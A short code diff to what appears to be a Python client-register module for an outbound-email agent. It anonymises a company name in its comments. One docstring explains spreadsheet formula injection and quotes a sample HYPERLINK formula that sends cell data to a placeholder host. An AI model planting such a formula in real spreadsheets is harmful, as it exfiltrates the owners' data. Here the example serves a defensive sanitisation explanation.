@@ -1,4 +1,4 @@
-"""SUPPLECO's active client list - the do-not-cold-email register.
+"""The client's active client list - the do-not-cold-email register.
 
 The agent must never send a cold pitch to a company that is already a customer.
 That is not a lost prospect, it is an existing commercial relationship being
@@ -149,7 +149,7 @@ _GENERIC_TOKENS = {
     "DEL",
     "DELLA",
     "THE",
-    # The industry's own vocabulary. SUPPLECO sells INTO this sector, so these
+    # The industry's own vocabulary. The client sells INTO this sector, so these
     # words appear in a large share of both the client list and the prospect
     # list - which makes them worthless as identity even though they look
     # specific. One real client is named NUTRACEUTICA S.R.L., i.e. the Italian
@@ -363,7 +363,7 @@ def _cell_safe(name: str) -> str:
     owns that page controls completely.
 
     So a page titled `=HYPERLINK("http://x/?"&A1,"Open")` becomes a formula in
-    SUPPLECO's real client register, which staff open in Excel. Leading "+", "-"
+    the client's real client register, which staff open in Excel. Leading "+", "-"
     and "@" are only dangerous on CSV import, which this path never uses, but
     they are prefixed too - the cost is one apostrophe and the rule is then one
     a reader can check without knowing which characters openpyxl special-cases.
